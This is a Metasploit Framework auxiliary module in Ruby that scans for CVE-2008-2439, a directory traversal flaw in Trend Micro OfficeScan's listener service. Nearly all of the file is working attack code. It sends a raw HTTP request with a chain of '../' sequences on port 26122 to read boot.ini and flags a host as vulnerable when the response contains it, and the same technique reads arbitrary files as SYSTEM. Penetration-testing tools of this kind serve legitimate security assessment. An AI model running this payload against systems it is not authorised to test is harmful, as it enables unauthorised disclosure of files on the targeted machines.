##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access',
            'Description' => %q{
              This module tests for directory traversal vulnerability in the UpdateAgent
              function in the OfficeScanNT Listener (TmListen.exe) service in Trend Micro
              OfficeScan. This allows remote attackers to read arbitrary files as SYSTEM
              via dot dot sequences in an HTTP request.
            },
            'References'  =>
                [
                    [ 'OSVDB', '48730' ],
                    [ 'CVE', '2008-2439' ],
                    [ 'BID', '31531' ],
                    [ 'URL', 'http://www.trendmicro.com/ftp/documentation/readme/OSCE_7.3_Win_EN_CriticalPatch_B1372_Readme.txt' ],
                ],
            'Author'      => [ 'Anshul Pandey <anshul999[at]gmail.com>', 'patrick' ],
            'License'     => MSF_LICENSE
        )
    )

    register_options(
      [
        Opt::RPORT(26122),
      ], self.class)
  end

  def run_host(target_host)

    res = send_request_raw(
      {
        'uri'     => '/activeupdate/../../../../../../../../../../../boot.ini',
        'method'  => 'GET',
      }, 20)

    if not res
      print_error("No response from server")
      return
    end

    http_fingerprint({ :response => res })

    if (res.code >= 200)
      if (res.body =~ /boot/)
        vuln = "vulnerable."
      else
        vuln = "not vulnerable."
      end
      if (res.headers['Server'])
        print_status("http://#{target_host}:#{rport} is running #{res.headers['Server']} and is #{vuln}")
      end
    end
  end
end
